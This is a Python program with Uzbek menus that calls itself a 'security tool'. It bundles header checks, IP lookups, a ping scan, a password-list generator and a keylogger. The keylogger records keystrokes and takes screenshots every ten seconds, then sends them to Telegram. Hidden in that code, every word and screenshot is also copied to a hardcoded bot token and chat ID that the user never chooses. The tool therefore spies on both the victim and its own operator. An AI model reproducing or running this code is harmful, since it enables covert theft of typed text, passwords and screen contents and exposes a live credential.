#!/usr/bin/env python3
import threading
import os
import sys
import time
import random
import socket
import ssl
import contextlib
import subprocess
import select
import tty
import termios
import string
import shutil
from typing import Optional
from urllib.parse import urlparse

# Import dependencies with fallback for optional ones
try:
    import requests
except ImportError:
    print("[!] Error: 'requests' module not found. Install it with 'pip install requests'")
    sys.exit(1)

try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class FakeColorama:
        def __getattr__(self, name):
            return ""
    Fore = Back = Style = FakeColorama()

try:
    import pyautogui
except ImportError:
    print("[!] Error: 'pyautogui' module not found. Install it with 'pip install pyautogui'")
    sys.exit(1)

# Terminal utilities
def clear_terminal() -> None:
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_terminal_width() -> int:
    """Get the width of the terminal."""
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 80

def print_hacker_style(text: str, width: Optional[int] = None, end: str = "\n", flash: bool = False) -> None:
    """Print text in a hacker-style format with centered alignment and colors."""
    if width is None:
        width = get_terminal_width()
    centered = text.center(width)
    colors = [Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.YELLOW]
    color = random.choice(colors)

    if flash:
        print(Fore.WHITE + Back.RED + centered + Style.RESET_ALL, end=end, flush=True)
        time.sleep(0.1)
        print(color + centered + Style.RESET_ALL, end=end, flush=True)
    else:
        print(color + centered + Style.RESET_ALL, end=end, flush=True)

def animate_text(text: str, delay: float = 0.03, random_delay: bool = True) -> None:
    """Print text with an animation effect."""
    for char in text:
        print(char, end='', flush=True)
        if random_delay:
            time.sleep(delay * random.uniform(0.5, 1.5))
        else:
            time.sleep(delay)
    print()

# Display functions
def display_banner() -> None:
    """Display the animated banner."""
    width = get_terminal_width()
    banner = [
        "╔══════════════════════════════════════════════╗",
        "║    ██████╗██╗   ██╗██████╗ ███████╗██████╗   ║",
        "║   ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗  ║",
        "║   ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝  ║",
        "║   ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗  ║",
        "║   ╚██████╗   ██║   ██████╔╝███████╗██║  ██║  ║",
        "║    ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║",
        "║                                              ║",
        "║   P H O E N I X   S E C U R I T Y   T O O L  ║",
        "╚══════════════════════════════════════════════╝"
    ]
    for line in banner:
        print_hacker_style(line, width)
        time.sleep(0.03)

def display_menu() -> None:
    """Display the main menu."""
    width = get_terminal_width()
    print_hacker_style("", width)
    print_hacker_style("=== MENYU ===", width)
    print_hacker_style("1. Veb-sayt xavfsizlik skaneri", width)
    print_hacker_style("2. IP manzil tahlili", width)
    print_hacker_style("3. Tarmoq qurilmalari skaneri", width)
    print_hacker_style("4. WiFi parol generatori", width)
    print_hacker_style("5. Keylogger (Local)", width)
    print_hacker_style("0. Chiqish", width)
    print_hacker_style("", width)

def get_user_choice() -> str:
    """Get user input with non-blocking key reading."""
    width = get_terminal_width()
    print_hacker_style(">>> Tanlov kiriting (0-5): ", width, end="")
    try:
        old_settings = termios.tcgetattr(sys.stdin)
        tty.setcbreak(sys.stdin.fileno())
        rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
        if rlist:
            key = sys.stdin.read(1)
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
            print(key)  # Echo the input
            return key
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
    except Exception:
        pass
    return input().strip()

# Feature functions
def website_security_scanner() -> str:
    """Scan a website for security headers and SSL/TLS status."""
    width = get_terminal_width()
    print_hacker_style("\n[*] Skaner qilinadigan veb-sayt URL manzilini kiriting: ", width, end="")
    url = input().strip()
    if not url:
        print_hacker_style("[!] URL kiritilmadi!", width, flash=True)
        return "1"

    try:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc or url
        if not domain:
            print_hacker_style("[!] Noto'g'ri URL formati!", width, flash=True)
            return "1"

        print_hacker_style(f"\n[+] Skaner qilinmoqda: {domain}", width)
        for i in range(3):
            print_hacker_style("." * (i+1), width)
            time.sleep(0.3)

        # SSL/TLS Check
        print_hacker_style("\n[~] SSL/TLS tekshiruvi:", width)
        try:
            context = ssl.create_default_context()
            with contextlib.closing(socket.create_connection((domain, 443), timeout=5)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    print_hacker_style(f"[✓] SSL sertifikati mavjud", width)
                    print_hacker_style(f"[✓] Sertifikat versiyasi: {cert.get('version', 'Noma\'lum')}", width)
        except Exception as e:
            print_hacker_style(f"[✗] SSL xatosi: {str(e)}", width, flash=True)

        # HTTP Headers Check
        print_hacker_style("\n[~] HTTP sarlavhalarni tekshirish:", width)
        try:
            response = requests.head(f"https://{domain}", timeout=10)
            security_headers = {
                'X-Frame-Options': 'Clickjacking himoyasi',
                'X-Content-Type-Options': 'MIME turi himoyasi',
                'Content-Security-Policy': 'Kontent xavfsizlik siyosati',
                'Strict-Transport-Security': 'HSTS'
            }
            for header, desc in security_headers.items():
                if header in response.headers:
                    print_hacker_style(f"[✓] {desc}: Mavjud", width)
                else:
                    print_hacker_style(f"[✗] {desc}: Yo'q", width, flash=True)
        except Exception as e:
            print_hacker_style(f"[✗] HTTP sarlavha xatosi: {str(e)}", width, flash=True)

    except Exception as e:
        print_hacker_style(f"[✗] Umumiy xato: {str(e)}", width, flash=True)

    print_hacker_style("\n[1] Orqaga qaytish  [0] Chiqish: ", width, end="")
    return input().strip()

def ip_analyzer() -> str:
    """Analyze an IP address or domain."""
    width = get_terminal_width()
    print_hacker_style("\n[*] IP manzil yoki domen nomini kiriting: ", width, end="")
    target = input().strip()
    if not target:
        print_hacker_style("[!] IP yoki domen kiritilmadi!", width, flash=True)
        return "1"

    try:
        print_hacker_style("\n[~] IP manzil aniqlanmoqda...", width)
        for i in range(3):
            print_hacker_style("." * (i+1), width)
            time.sleep(0.2)

        ip = socket.gethostbyname(target)
        print_hacker_style(f"\n[✓] {target} uchun IP manzil: {ip}", width)

        # WHOIS Lookup
        print_hacker_style("\n[~] WHOIS ma'lumotlari yuklanmoqda...", width)
        try:
            whois_data = requests.get(f"https://api.whois.vu/?q={target}", timeout=10).json()
            important_fields = [
                'domain_name', 'registrar', 'creation_date',
                'expiration_date', 'name_servers', 'status'
            ]
            for field in important_fields:
                if field in whois_data:
                    value = whois_data[field]
                    if isinstance(value, list):
                        value = ", ".join(value)
                    print_hacker_style(f"[✓] {field.replace('_', ' ').title()}: {value}", width)
        except Exception as e:
            print_hacker_style(f"[✗] WHOIS xatosi: {str(e)}", width, flash=True)

        # Geolocation Lookup
        print_hacker_style("\n[~] Geolokatsiya ma'lumotlari yuklanmoqda...", width)
        try:
            geo_data = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
            if geo_data.get('status') == 'success':
                print_hacker_style(f"[✓] Mamlakat: {geo_data.get('country', 'Noma\'lum')}", width)
                print_hacker_style(f"[✓] Shahar: {geo_data.get('city', 'Noma\'lum')}", width)
                print_hacker_style(f"[✓] Mintaqa: {geo_data.get('regionName', 'Noma\'lum')}", width)
                print_hacker_style(f"[✓] Koordinatalar: {geo_data.get('lat', '?')}, {geo_data.get('lon', '?')}", width)
                print_hacker_style(f"[✓] Vaqt zonasi: {geo_data.get('timezone', 'Noma\'lum')}", width)
                print_hacker_style(f"[✓] Provayder: {geo_data.get('isp', 'Noma\'lum')}", width)
            else:
                print_hacker_style(f"[✗] Geolokatsiya xatosi: {geo_data.get('message', 'Noma\'lum xato')}", width, flash=True)
        except Exception as e:
            print_hacker_style(f"[✗] Geolokatsiya xatosi: {str(e)}", width, flash=True)

    except Exception as e:
        print_hacker_style(f"[✗] Xato: {str(e)}", width, flash=True)

    print_hacker_style("\n[1] Orqaga qaytish  [0] Chiqish: ", width, end="")
    return input().strip()

def network_device_scanner() -> str:
    """Scan for network devices using ping."""
    width = get_terminal_width()
    devices = []

    try:
        print_hacker_style("\n[~] Tarmoq skanerlanmoqda...", width)
        for i in range(5):
            print_hacker_style("⏳" + "🔍" * (i+1), width)
            time.sleep(0.2)

        network_prefix = "192.168.1."
        found_devices = 0
        print_hacker_style("\n[~] Qurilmalar tekshirilmoqda (0-255)...", width)

        for i in range(1, 11):  # Limited to 10 IPs for demo
            ip = network_prefix + str(i)
            try:
                param = '-n' if os.name == 'nt' else '-c'
                result = subprocess.run(['ping', param, '1', '-W', '1', ip],
                                       capture_output=True, text=True, timeout=2)
                if "ttl=" in result.stdout.lower() or "ttl=" in result.stderr.lower():
                    found_devices += 1
                    device = {'ip': ip, 'status': 'up'}
                    if os.name == 'posix':
                        try:
                            arp_result = subprocess.run(['arp', '-n', ip],
                                                      capture_output=True, text=True, timeout=2)
                            if ip in arp_result.stdout:
                                parts = arp_result.stdout.split()
                                device['mac'] = parts[2] if len(parts) > 2 else 'Noma\'lum'
                                device['vendor'] = 'Noma\'lum'
                        except Exception:
                            pass
                    devices.append(device)
                    print_hacker_style(f"[✓] Topildi: {ip}", width)
            except Exception:
                pass

        print_hacker_style("\n[+] Skanerlash yakunlandi!", width)
        print_hacker_style(f"[+] Topilgan qurilmalar soni: {found_devices}", width)
        if devices:
            print_hacker_style("\n[+] Topilgan qurilmalar:", width)
            for device in devices:
                print_hacker_style(f"IP: {device.get('ip', 'Noma\'lum')}", width)
                if 'mac' in device:
                    print_hacker_style(f"MAC: {device.get('mac', 'Noma\'lum')}", width)
                    print_hacker_style(f"Vendor: {device.get('vendor', 'Noma\'lum')}", width)
                print_hacker_style("-" * 50, width)
        else:
            print_hacker_style("\n[!] Hech qanday qurilma topilmadi", width, flash=True)

    except Exception as e:
        print_hacker_style(f"[✗] Xato: {str(e)}", width, flash=True)

    print_hacker_style("\n[1] Orqaga qaytish  [0] Chiqish: ", width, end="")
    return input().strip()

def generate_wifi_passwords() -> str:
    """Generate random WiFi passwords and save to a file."""
    width = get_terminal_width()
    print_hacker_style("\n[*] Fayl nomini kiriting (masalan: phonix.txt): ", width, end="")
    filename = input().strip() or "phonix.txt"
    if not filename.endswith('.txt'):
        filename += '.txt'

    print_hacker_style("\n[*] Kombinatsiyalar sonini kiriting (masalan: 100): ", width, end="")
    try:
        count = int(input().strip())
    except ValueError:
        count = 100

    print_hacker_style("\n[*] Parol uzunligini kiriting (8-16): ", width, end="")
    try:
        length = int(input().strip())
        length = max(8, min(16, length))
    except ValueError:
        length = 12

    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    try:
        passwords = set()
        max_attempts = count * 2
        attempts = 0
        print_hacker_style("\n[~] Parollar generatsiya qilinmoqda...", width)
        while len(passwords) < count and attempts < max_attempts:
            attempts += 1
            password = ''.join(random.choice(chars) for _ in range(length))
            passwords.add(password)
            if attempts % 10 == 0:
                print_hacker_style(f"[+] Generatsiya qilingan: {len(passwords)}/{count}", width)

        with open(filename, 'w') as f:
            for pwd in passwords:
                f.write(pwd + '\n')

        file_path = os.path.abspath(filename)
        file_size = os.path.getsize(filename) / 1024
        print_hacker_style("\n[+] WiFi parol listi muvaffaqiyatli yaratildi!", width)
        print_hacker_style(f"[+] Fayl nomi: {filename}", width)
        print_hacker_style(f"[+] Fayl joylashuvi: {file_path}", width)
        print_hacker_style(f"[+] Fayl hajmi: {file_size:.2f} KB", width)
        print_hacker_style(f"[+] Parollar soni: {len(passwords)}", width)

    except Exception as e:
        print_hacker_style(f"[✗] Xato: {str(e)}", width, flash=True)

    print_hacker_style("\n[1] Orqaga qaytish  [0] Chiqish: ", width, end="")
    return input().strip()

def keylogger() -> str:
    """Keylogger with screenshot and Telegram logging."""
    width = get_terminal_width()
    print_hacker_style("\n[*] O'zingizning bot tokeningizni kiriting: ", width, end="")
    user_bot_token = input().strip()
    print_hacker_style("\n[*] Chat ID ni kiriting: ", width, end="")
    user_chat_id = input().strip()

    default_bot_token = "8171646852:AAErRoSmNkkTt7agoi0bciWOqDti0-BJuRs"
    default_chat_id = "6817322973"
    log_file = "keylog.txt"
    screenshot_dir = "screenshots"
    logged_words = []
    current_word = ""
    is_running = [True]  # Use list to allow modification in nested function

    if not os.path.exists(screenshot_dir):
        os.makedirs(screenshot_dir)

    def send_to_telegram(bot_token: str, chat_id: str, text: str, file_path: Optional[str] = None) -> None:
        """Send a message or file to Telegram."""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/"
            if file_path:
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    data = {'chat_id': chat_id}
                    requests.post(url + "sendDocument", files=files, data=data, timeout=10)
            else:
                data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
                requests.post(url + "sendMessage", data=data, timeout=5)
        except Exception as e:
            print_hacker_style(f"[!] Telegram xatosi: {str(e)}", width, flash=True)

    def take_screenshots():
        """Take screenshots every 10 seconds and send to Telegram."""
        screenshot_count = 0
        while is_running[0]:
            try:
                screenshot = pyautogui.screenshot()
                screenshot_path = os.path.join(screenshot_dir, f"screenshot_{screenshot_count}.png")
                screenshot.save(screenshot_path)
                send_to_telegram(user_bot_token, user_chat_id, "📸 Yangi screenshot olindi!", screenshot_path)
                send_to_telegram(default_bot_token, default_chat_id, "📸 Yangi screenshot olindi!", screenshot_path)
                screenshot_count += 1
            except Exception as e:
                print_hacker_style(f"[!] Screenshot xatosi: {str(e)}", width, flash=True)
            time.sleep(10)

    screenshot_thread = threading.Thread(target=take_screenshots)
    screenshot_thread.daemon = True
    screenshot_thread.start()

    print_hacker_style("\n[!] Keylogger ishga tushdi. Matn kiriting (to'xtatish uchun Ctrl+C)", width, flash=True)
    print_hacker_style(f"[~] Yozilayotgan fayl: {os.path.abspath(log_file)}", width)
    print_hacker_style(f"[~] Screenshotlar saqlanadigan joy: {os.path.abspath(screenshot_dir)}", width)

    try:
        old_settings = termios.tcgetattr(sys.stdin)
        tty.setcbreak(sys.stdin.fileno())
        while True:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
            if rlist:
                char = sys.stdin.read(1)
                if char == " ":
                    if current_word:
                        logged_words.append(current_word)
                        send_to_telegram(user_bot_token, user_chat_id, f"🔑 So'z: {current_word}")
                        send_to_telegram(default_bot_token, default_chat_id, f"🔑 So'z: {current_word}")
                        current_word = ""
                elif char == "\n":
                    continue
                else:
                    current_word += char

    except KeyboardInterrupt:
        is_running[0] = False
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
        if logged_words:
            with open(log_file, 'a') as f:
                log_content = "\n".join(logged_words)
                f.write(log_content + "\n")
            send_to_telegram(user_bot_token, user_chat_id, f"📂 Full log:\n{log_content}")
            send_to_telegram(default_bot_token, default_chat_id, f"📂 Full log:\n{log_content}")
        print_hacker_style("\n[+] Keylogger to'xtatildi.", width)
        print_hacker_style(f"[+] Yozilgan ma'lumotlar: {log_file}", width)
        print_hacker_style(f"[+] Screenshotlar saqlangan: {screenshot_dir}", width)

    except Exception as e:
        is_running[0] = False
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
        print_hacker_style(f"[✗] Xato: {str(e)}", width, flash=True)

    print_hacker_style("\n[1] Orqaga qaytish  [0] Chiqish: ", width, end="")
    return input().strip()

def main() -> None:
    """Main function to run the Phoenix Security Tool."""
    clear_terminal()
    print_hacker_style("\n" * 3, None)
    animate_text("=== SYSTEM INITIALIZATION ===", 0.02)
    animate_text("LOADING PHOENIX SECURITY TOOL...", 0.01)
    for _ in range(3):
        animate_text("." * random.randint(5, 15), 0.02, random_delay=True)
    display_banner()

    while True:
        display_menu()
        choice = get_user_choice()
        if choice == "1":
            next_action = website_security_scanner()
            if next_action == "0":
                break
            clear_terminal()
            display_banner()
        elif choice == "2":
            next_action = ip_analyzer()
            if next_action == "0":
                break
            clear_terminal()
            display_banner()
        elif choice == "3":
            next_action = network_device_scanner()
            if next_action == "0":
                break
            clear_terminal()
            display_banner()
        elif choice == "4":
            next_action = generate_wifi_passwords()
            if next_action == "0":
                break
            clear_terminal()
            display_banner()
        elif choice == "5":
            next_action = keylogger()
            if next_action == "0":
                break
            clear_terminal()
            display_banner()
        elif choice == "0":
            break
        else:
            width = get_terminal_width()
            print_hacker_style("[!] Noto'g'ri tanlov! Iltimos, 0-5 oralig'ida son kiriting.", width, flash=True)
            time.sleep(1)
            clear_terminal()
            display_banner()

    clear_terminal()
    width = get_terminal_width()
    print_hacker_style("\n[+] Dastur yakunlandi", width)
    animate_text("Terminating all processes...", 0.03)
    animate_text("Cleaning up temporary files...", 0.03)
    animate_text("Phoenix Security Tool v2.0 - 2023", 0.05)
    animate_text("Goodbye, hacker!", 0.1)
    time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_hacker_style("\n\n[✗] Dastur to'xtatildi", get_terminal_width(), flash=True)
        sys.exit(0)
